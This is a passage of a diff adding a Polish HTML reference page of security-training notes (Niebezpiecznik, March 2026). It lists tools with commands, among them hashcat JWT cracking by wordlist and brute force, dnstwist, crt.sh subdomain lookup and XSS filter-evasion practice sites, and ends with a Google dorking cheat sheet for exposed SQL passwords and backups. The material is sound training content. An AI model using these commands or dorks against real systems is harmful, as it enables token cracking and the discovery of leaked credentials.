+# Chrome: chrome web store
+#   szukaj "DotGit"
+
+# Dziala automatycznie —
+# powiadamia gdy wykryje
+# .git na odwiedzanej stronie</code></pre>
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <strong>Hashcat</strong><br /><span class="tag tag-tool"
+                            >cracking</span
+                        >
+                    </td>
+                    <td>
+                        Lamanie hasel i tokenow. Tryb 16500 = JWT
+                        (HS256/HS384/HS512).
+                    </td>
+                    <td>
+                        <pre><code># Lamanie JWT slownikiem:
+hashcat -m 16500 jwt.txt wordlist.txt
+
+# Brute-force (6 malych liter):
+hashcat -m 16500 jwt.txt -a 3 '?l?l?l?l?l?l'
+
+# Zapisz token do pliku:
+echo "eyJhbG...pelny_jwt" > jwt.txt</code></pre>
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <strong>dnstwist</strong><br /><span
+                            class="tag tag-tool"
+                            >recon</span
+                        >
+                    </td>
+                    <td>
+                        Generuje permutacje domeny i sprawdza ktore sa
+                        zarejestrowane (typosquatting).
+                    </td>
+                    <td>
+                        <pre><code># Instalacja:
+pip install dnstwist
+
+# Skanowanie:
+dnstwist example.com
+
+# Z dodatkowymi informacjami:
+dnstwist --registered \
+  --mxcheck --geoip \
+  example.com</code></pre>
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <strong>HTTP Toolkit</strong><br /><span
+                            class="tag tag-tool"
+                            >proxy</span
+                        >
+                    </td>
+                    <td>
+                        Przechwytywanie ruchu HTTP — szczegolnie z aplikacji
+                        mobilnych (Android/ADB).
+                    </td>
+                    <td>
+                        <pre><code># Instalacja:
+# https://httptoolkit.com/
+
+# Polaczenie z Android:
+adb devices
+# Wybierz "Android device via ADB"
+# w interfejsie HTTP Toolkit</code></pre>
+                    </td>
+                </tr>
+            </table>
+        </div>
+
+        <!-- WEBSITES -->
+        <div class="ref-section">
+            <h3>🌍 Strony internetowe i serwisy</h3>
+
+            <table>
+                <tr>
+                    <th style="width: 25%">Strona</th>
+                    <th style="width: 35%">Opis</th>
+                    <th style="width: 40%">Uzycie</th>
+                </tr>
+                <tr>
+                    <td>
+                        <a
+                            href="https://www.ssllabs.com/ssltest/"
+                            target="_blank"
+                            ><strong>SSL Labs</strong></a
+                        ><br />ssllabs.com
+                    </td>
+                    <td>
+                        Testowanie konfiguracji TLS/SSL serwera. Ocena A+ do F.
+                    </td>
+                    <td>
+                        Wejdz → wpisz domene → czekaj na raport. Sprawdz wersje
+                        TLS, cipher suites, lancuch certyfikatow.
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <a
+                            href="https://ssl-config.mozilla.org/"
+                            target="_blank"
+                            ><strong>SSL Config Generator</strong></a
+                        ><br />ssl-config.mozilla.org
+                    </td>
+                    <td>
+                        Generator konfiguracji TLS dla Nginx, Apache, HAProxy
+                        itp.
+                    </td>
+                    <td>
+                        Wybierz serwer → poziom bezpieczenstwa → kopiuj-wklej
+                        konfiguracje.
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <a href="https://crt.sh" target="_blank"
+                            ><strong>crt.sh</strong></a
+                        >
+                    </td>
+                    <td>
+                        Wyszukiwarka Certificate Transparency. Odkrywanie
+                        subdomen i certyfikatow.
+                    </td>
+                    <td>
+                        <code>https://crt.sh/?q=%25.example.com</code> — lista
+                        wszystkich certyfikatow (i subdomen) dla domeny.
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <a href="https://haveibeensquatted.com" target="_blank"
+                            ><strong>haveibeensquatted.com</strong></a
+                        >
+                    </td>
+                    <td>
+                        Sprawdzanie czy ktos zarejestrowal domeny podobne do
+                        Twojej.
+                    </td>
+                    <td>
+                        Wpisz domene → zobacz liste potencjalnych
+                        kopii/typosquattow.
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <a href="https://www.keycloak.org" target="_blank"
+                            ><strong>Keycloak</strong></a
+                        ><br />keycloak.org
+                    </td>
+                    <td>
+                        Open-source IAM — zarzadzanie tozsamoscia, JWT, SSO,
+                        OAuth2.
+                    </td>
+                    <td>
+                        Idealne do nauki JWT w praktyce. Wspiera OIDC, SAML,
+                        social login.
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <strong>Rentgen</strong><br /><span class="tag tag-web"
+                            >Firefox addon</span
+                        >
+                    </td>
+                    <td>
+                        Wtyczka do Firefoksa — skanuje strony pod katem
+                        trackerow, pomaga zglaszac naruszenia RODO.
+                    </td>
+                    <td>
+                        Zainstaluj z Firefox Add-ons → skanuje automatycznie
+                        odwiedzane strony.
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <a
+                            href="https://www.cloudflare.com/ips/"
+                            target="_blank"
+                            ><strong>Cloudflare IPs</strong></a
+                        >
+                    </td>
+                    <td>
+                        Oficjalna lista adresow IP Cloudflare — do konfiguracji
+                        firewalla.
+                    </td>
+                    <td>
+                        Zezwol na ruch TYLKO z tych IP, jesli uzywasz Cloudflare
+                        jako proxy.
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <a href="https://prompt.ml/" target="_blank"
+                            ><strong>prompt.ml</strong></a
+                        >
+                    </td>
+                    <td>
+                        Wyzwania XSS — 16 poziomow + 4 ukryte. Praktyczna nauka
+                        omijania filtrow.
+                    </td>
+                    <td>
+                        Wejdz → rozwiazuj kolejne poziomy wstrzykujac JS mimo
+                        filtrow. Tez na Web Archive.
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <a href="https://escape.alf.nu/" target="_blank"
+                            ><strong>escape.alf.nu</strong></a
+                        >
+                    </td>
+                    <td>
+                        "alert(1) to win!" — 15 wyzwan XSS na omijanie filtrow.
+                    </td>
+                    <td>
+                        Wejdz → wpisuj payloady XSS → cel: wywolac
+                        <code>alert(1)</code> mimo filtrow.
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <a href="https://jsfuck.com/" target="_blank"
+                            ><strong>jsfuck.com</strong></a
+                        >
+                    </td>
+                    <td>
+                        Konwerter JavaScript → JSFuck (tylko 6 znakow:
+                        <code>[]()!+</code>).
+                    </td>
+                    <td>
+                        Wklej dowolny JS → otrzymasz wersje z samych
+                        <code>[]()!+</code>.
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <strong>escape-goat</strong><br /><span
+                            class="tag tag-web"
+                            >npm package</span
+                        >
+                    </td>
+                    <td>
+                        Biblioteka do HTML escaping — bezpieczne wklejanie
+                        stringow do HTML.
+                    </td>
+                    <td>
+                        <code>npm install escape-goat</code> → uzyj jako tagged
+                        template literal lub funkcje.
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <a
+                            href="https://github.com/cure53/DOMPurify"
+                            target="_blank"
+                            ><strong>DOMPurify</strong></a
+                        >
+                    </td>
+                    <td>
+                        Sanitizer HTML dla JS — fallback do setHTML().
+                        Produkcyjny standard.
+                    </td>
+                    <td>
+                        <code>DOMPurify.sanitize(dirty)</code> → czysty HTML bez
+                        XSS.
+                    </td>
+                </tr>
+            </table>
+        </div>
+
+        <!-- GOOGLE DORKS CHEATSHEET -->
+        <div class="ref-section">
+            <h3>🔍 Google Dorking — scigawka</h3>
+            <table>
+                <tr>
+                    <th>Operator</th>
+                    <th>Opis</th>
+                    <th>Przyklad</th>
+                </tr>
+                <tr>
+                    <td><code>intitle:</code></td>
+                    <td>Szuka w tytule strony</td>
+                    <td><code>intitle:"index of" backup</code></td>
+                </tr>
+                <tr>
+                    <td><code>inurl:</code></td>
+                    <td>Szuka w adresie URL</td>
+                    <td><code>inurl:admin login</code></td>
+                </tr>
+                <tr>
+                    <td><code>filetype:</code></td>
+                    <td>Szuka plikow okreslonego typu</td>
+                    <td><code>filetype:sql "password"</code></td>
+                </tr>
+                <tr>
+                    <td><code>site:</code></td>
+                    <td>Ogranicza do domeny</td>
+                    <td><code>site:example.com filetype:pdf</code></td>
+                </tr>
+                <tr>
+                    <td><code>cache:</code></td>
+                    <td>Pokazuje wersje z cache Google</td>
+                    <td><code>cache:example.com</code></td>
+                </tr>
+            </table>
+        </div>
+
+        <hr class="divider" />
+        <p
+            style="
+                color: var(--text-muted);
+                text-align: center;
+                font-size: 0.85rem;
+                margin-top: 2rem;
+            "
+        >
+            Notatki ze szkolenia Niebezpiecznik | Zorganizowane, zweryfikowane i
+            uzupelnione | Marzec 2026
+        </p>
+    </body>
+</html>
